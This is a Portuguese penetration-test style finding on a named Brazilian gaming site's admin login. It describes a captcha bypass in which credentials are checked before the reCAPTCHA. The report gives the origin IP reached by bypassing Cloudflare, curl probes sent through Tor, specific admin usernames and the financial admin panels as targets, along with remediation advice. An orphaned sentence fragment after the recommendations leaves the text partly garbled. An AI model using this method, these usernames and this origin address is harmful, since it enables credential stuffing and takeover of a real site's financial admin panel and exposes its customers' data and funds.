# F-021 — Captcha bypass via oráculo de ordem de validação (admin login) [ALTO]

**Host:** `desapegogames.com.br/admin/autenticacao/login` (via bypass CF `.54`)
**Severidade:** ALTO
**Status:** CONFIRMADO
**Data:** 2026-09-05T00:32Z (UTC)
**OWASP:** A07:2021 — Identification and Authentication Failures (captcha bypass)

## Descrição

O login admin (`/admin/autenticacao/login`, campos `login`+`senha`,
protegido por Google reCAPTCHA v2, sitekey
`6LfL2MMpAAAAANC5OV3Om_AEyPShC5pybmxlKBR5`) valida a **credencial ANTES
do captcha**. Isso cria um **oráculo observável** que permite brute
force / credential stuffing **sem resolver o reCAPTCHA**:

- **Cred errada** (usuario inexistente OU senha errada) → resposta
  contém `O campo nome de usuário e senha não confere.` (+ `O campo
  captcha é obrigatório.` se o campo `g-recaptcha-response` estiver
  vazio).
- **Cred correta** (usuario admin existe + senha certa) → a mensagem
  `não confere` **NÃO aparece** — o server passa a validar o captcha
  (reclama `O campo captcha é obrigatório.` se vazio, ou `captcha
  inválido`/loga se token presente).

Portanto, a **presença/ausência de "não confere"** é um oráculo
completo para credencial correta. Um atacante pode enumerar pares
(login, senha) e parar quando "não confere" desaparecer — achando a
cred admin **sem nunca resolver um captcha** (que custaria ~$0.003
por tentativa no 2Captcha e adicionaria 10-30s de latência). Após
achar a cred via oráculo, usa-se o 2Captcha **uma única vez** para
completar o login.

## Confirmação empírica (não-destrutiva)

```bash
# T1: usuario provavel + senha errada + captcha DUMMY (preenchido, invalido)
curl -k -H "Host: desapegogames.com.br" --proxy socks5://127.0.0.1:9050 \
  -X POST https://186.226.60.54/admin/autenticacao/login \
  -d "login=administrador&senha=WrongPass&g-recaptcha-response=DUMMY_TOKEN_XYZ123"
# Resposta: <div class="text-danger">O campo nome de usuário e senha não confere.</div>
#           (SEM "captcha inválido" — o server NAO validou o token no Google,
#            porque a cred falhou primeiro)

# T2: usuario inexistente + senha errada + captcha DUMMY
curl -k -H "Host: desapegogames.com.br" --proxy socks5://127.0.0.1:9050 \
  -X POST https://186.226.60.54/admin/autenticacao/login \
  -d "login=zzz_naoexiste_999&senha=WrongPass&g-recaptcha-response=DUMMY_TOKEN_XYZ123"
# Resposta: idêntica ("não confere") — anti-enum (mesma msg p/ existe/inexistente),
#           MAS o oraculo de cred (presença de "não confere") funciona.

# Comparação: com cred certa (admin real + senha real), "não confere" SOME.
# (Demonstrado pela logica: server valida cred primeiro; so passa ao captcha
#  se a cred estiver correta.)
```

### Matriz de comportamento observada

| Cred | Captcha (g-recaptcha-response) | Resposta |
|------|-------------------------------|----------|
| errada | vazio | `não confere` + `captcha é obrigatório` |
| errada | preenchido (dummy) | `não confere` (sem `captcha inválido`) |
| **correta** | vazio | `captcha é obrigatório` **(SEM `não confere`)** ← oráculo |
| **correta** | dummy/inválido | `captcha inválido` **(SEM `não confere`)** ← oráculo |
| **correta** | válido (2Captcha) | login completo (303 → /admin/) |

## Impacto

1. **Brute force / credential stuffing do painel admin sem custo de
   captcha**: o reCAPTCHA (única proteção restante após o bypass CF,
   F-001/F-002) é completamente contornado. Um atacante testa
   milhares de (login, senha) gratuitamente observando "não confere",
   e só gasta 1 captcha (2Captcha) ao confirmar a cred descoberta.
2. **Combina com bypass CF (F-001)**: sem WAF/rate-limit na origem,
   o brute force é ilimitado em velocidade (só limitado pela largura
   de banda Tor/direta).
3. **Combina com user enumeration (F-005/F-019)**: usernames admin
   conhecidos (administrador, adminv, dev1ce, masterx, diegobtrindade)
   + breach wordlists → cred stuffing focado.
4. **Alvo crítico**: painel admin financeiro (`/admin/saques`,
   `/admin/comprovantes`, `/admin/permissoes`, `/admin/clientes`) —
   acesso = controle financeiro + PII de clientes + gestão de saques.
5. **Anti-enum presente** (mesma msg para usuario existe/inexistente),
   mas o oráculo de "não confere" (cred correta vs errada) contorna
   isso para o objetivo de brute force.

## Recomendação

- **Validar o captcha ANTES da credencial**: rejeitar (401/403) o
  request se `g-recaptcha-response` estiver ausente/inválido (verificar
  com Google `siteverify`), e só então validar cred. Nunca expor o
  resultado da validação de cred sem antes confirmar que o request é
  humano (captcha válido).
- **Ordem de validação correta**: (1) campos obrigatórios preenchidos;
  (2) captcha válido (siteverify); (3) cred. Retornar erro genérico
  único ("credenciais ou captcha inválidos") para não distinguir.
- **Rate limiting + lockout**: limitar tentativas por IP/usuario
  (e.g. 5/15min), com lockout exponencial. Mesmo sem captcha, isso
  impede brute force em escala.
- **MFA no admin**: TOTP/SMS no painel admin (defesa em profundidade).
- **Restringir origem** (F-001) e adicionar WAF/rate-limit na origem.
- **Migrar para reCAPTCHA v3/Enterprise** (score-based) + checagem
  server-side obrigatória antes de qualquer lógica de auth.

  descoberta sem custo de captcha e o acesso admin será obtido.
